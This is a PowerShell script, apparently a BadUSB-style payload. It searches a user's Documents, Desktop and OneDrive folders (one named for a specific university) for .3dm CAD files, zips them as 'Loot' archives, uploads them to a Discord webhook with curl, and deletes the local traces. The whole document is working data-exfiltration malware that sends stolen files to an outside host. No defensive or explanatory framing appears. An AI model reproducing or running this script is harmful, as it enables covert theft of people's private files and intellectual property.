$hookurl = "$dc"
# Shortened URL Detection
if ($hookurl.Length -ne 121) {
    Write-Host "Shortened Webhook URL Detected.."
    $hookurl = (irm $hookurl).url
}

Function Exfiltrate {
    param ([string[]]$FileType, [string[]]$Path)
    $maxZipFileSize = 25MB
    $currentZipSize = 0
    $index = 1
    $zipFilePath = "$env:temp/Loot$index.zip"

    # Define folders to search, including the new folder path
    if ($Path -ne $null) {
        $foldersToSearch = "$env:USERPROFILE\" + $Path
    } else {
        $foldersToSearch = @(
            "$env:USERPROFILE\Documents",
            "$env:USERPROFILE\Desktop",
            "$env:USERPROFILE\OneDrive",
            "$env:USERPROFILE\OneDrive - University of Nebraska-Lincoln"
        )
    }

    # Define file extensions to search for (.3dm files only)
    if ($FileType -ne $null) {
        $fileExtensions = "*." + $FileType
    } else {
        $fileExtensions = @("*.3dm")
    }

    Add-Type -AssemblyName System.IO.Compression.FileSystem
    $zipArchive = [System.IO.Compression.ZipFile]::Open($zipFilePath, 'Create')

    foreach ($folder in $foldersToSearch) {
        foreach ($extension in $fileExtensions) {
            $files = Get-ChildItem -Path $folder -Filter $extension -File -Recurse
            foreach ($file in $files) {
                $fileSize = $file.Length
                if ($currentZipSize + $fileSize -gt $maxZipFileSize) {
                    # Close current archive and upload it to Discord webhook
                    $zipArchive.Dispose()
                    curl.exe -F file1=@"$zipFilePath" $hookurl
                    Remove-Item -Path $zipFilePath -Force

                    # Reset variables for new archive creation
                    Sleep 1
                    $index++
                    $zipFilePath = "$env:temp/Loot$index.zip"
                    $zipArchive = [System.IO.Compression.ZipFile]::Open($zipFilePath, 'Create')
                }
                # Add file to the archive
                $entryName = $file.FullName.Substring($folder.Length + 1)
                [System.IO.Compression.ZipFileExtensions]::CreateEntryFromFile($zipArchive, $file.FullName, $entryName)
                $currentZipSize += $fileSize
            }
        }
    }
    
    # Finalize and upload remaining archive contents
    $zipArchive.Dispose()
    curl.exe -F file1=@"$zipFilePath" $hookurl
    Remove-Item -Path $zipFilePath -Force

    Write-Output "$env:COMPUTERNAME : Exfiltration Complete."
}

# Execute the function with .3dm file type filter and default paths
Exfiltrate FileType "3dm"
